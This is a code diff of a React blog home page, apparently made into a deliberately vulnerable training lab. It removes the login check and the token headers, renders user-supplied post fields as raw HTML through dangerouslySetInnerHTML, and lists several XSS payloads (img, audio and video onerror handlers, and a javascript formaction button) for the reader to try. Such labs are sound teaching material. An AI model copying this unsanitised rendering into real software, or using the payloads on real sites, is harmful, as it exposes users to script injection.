@@ -1,102 +1,97 @@
-import React, { useState, useEffect, useContext } from "react";
-import { AuthContext } from "../helpers/AuthContext";
-import { Navigate, useNavigate } from "react-router-dom";
+import React, { useState, useEffect } from "react";
 
 function Home() {
   const [allPosts, setAllPosts] = useState([]);
-  const [title, setTitle] = useState("");
-  const [content, setContent] = useState("");
-  const [username, setUsername] = useState("");
-  const { authState } = useContext(AuthContext);
-  let navigate = useNavigate();
 
   useEffect(() => {
-    //Check if user is logged in
-    if (!localStorage.getItem("accessToken")) {
-      navigate("/login");
-    } else {
-      fetch("http://localhost:5000/posts", {
-        method: "GET",
-        headers: {
-          "Content-Type": "application/json",
-          accessToken: localStorage.getItem("accessToken"),
-        },
-      })
-        .then((res) => res.json())
-        .then((data) => setAllPosts(data));
-    }
+    fetch("http://localhost:5000/posts") // Fetch all posts
+      .then((res) => res.json())
+      .then((data) => setAllPosts(data));
   }, []);
 
-  const createPost = () => {
+  const createPost = (title, content, username) => {
     fetch("http://localhost:5000/posts", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        accessToken: localStorage.getItem("accessToken"),
-      },
-      body: JSON.stringify({
-        title: title,
-        content: content,
-        username: username,
-      }),
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ title, content, username }),
     }).then((res) => {
       if (res.ok) {
-        fetch("http://localhost:5000/posts", {
-          method: "GET",
-          headers: {
-            "Content-Type": "application/json",
-            accessToken: localStorage.getItem("accessToken"),
-          },
-        })
+        fetch("http://localhost:5000/posts") // Re-fetch posts after creation
           .then((res) => res.json())
           .then((data) => setAllPosts(data));
       }
-      setTitle("");
-      setContent("");
-      setUsername("");
+      document.getElementById("title").value = "";
+      document.getElementById("content").value = "";
+      document.getElementById("username").value = "";
     });
   };
 
   return (
     <div className="App">
-      <h1>Home</h1>
-      <br />
       <div className="createPostForm">
-        <input
-          type="text"
-          placeholder="Title"
-          value={title}
-          onChange={(event) => {
-            setTitle(event.target.value);
-          }}
-        />
-        <input
-          className="contentForm"
-          placeholder="Content"
-          value={content}
-          onChange={(event) => {
-            setContent(event.target.value);
-          }}
-        />
-        <input
-          type="text"
-          placeholder="Username"
-          value={username}
-          onChange={(event) => {
-            setUsername(event.target.value);
-          }}
-        />
-        <button onClick={() => createPost()}>Create Post</button>
+        {/* Create Post Form (XSS Vulnerability) */}
+        <input type="text" id="title" placeholder="Title" />
+        <input id="content" placeholder="Content" className="contentForm" />
+        <input type="text" id="username" placeholder="Username" />
+        <button
+          onClick={() =>
+            createPost(
+              document.getElementById("title").value,
+              document.getElementById("content").value,
+              document.getElementById("username").value
+            )
+          }
+        >
+          Create Post
+        </button>
+      </div>
+      <br />
+      <div>
+        <h3>XSS Vulnerability here!</h3>
+        <p>Insert these texts into any or all the fields above:</p>
+        <ul>
+          <li>
+            {"<"}img src=x onerror=alert(1){">"}
+          </li>
+          <li>
+            {"<"}image src/onerror=prompt(8){">"}
+          </li>
+          <li>
+            {"<"}audio src=1 href=1 onerror="javascript:alert(1)"{">"}
+            {"<"}/audio{">"}
+          </li>
+          <li>
+            {"<"}video src=1 href=1 onerror="javascript:alert(1)"{">"}
+            {"<"}/video{">"}
+          </li>
+          <li>
+            {"<"}form{">"}
+            {"<"}button formaction="javascript:javascript:alert(1)"{">"}X
+          </li>
+        </ul>
+        <p>
+          Note: For the last XSS look for the post that has a button "X" and
+          click on it
+        </p>
       </div>
 
-      {/* Display Posts (PlainText) */}
+      {/* Display Posts (XSS Vulnerability) */}
       <div>
         {allPosts.map((post) => {
           return (
             <div key={post.id} className="post">
-              <div className="title"> {post.title} </div>
-              <div className="body"> {post.content} </div>
-              <div className="footer"> {post.username} </div>
+              <div
+                className="title"
+                dangerouslySetInnerHTML={{ __html: post.title }}
+              />
+              <div
+                className="body"
+                dangerouslySetInnerHTML={{ __html: post.content }}
+              />
+              <div
+                className="footer"
+                dangerouslySetInnerHTML={{ __html: post.username }}
+              />
             </div>
           );
         })}
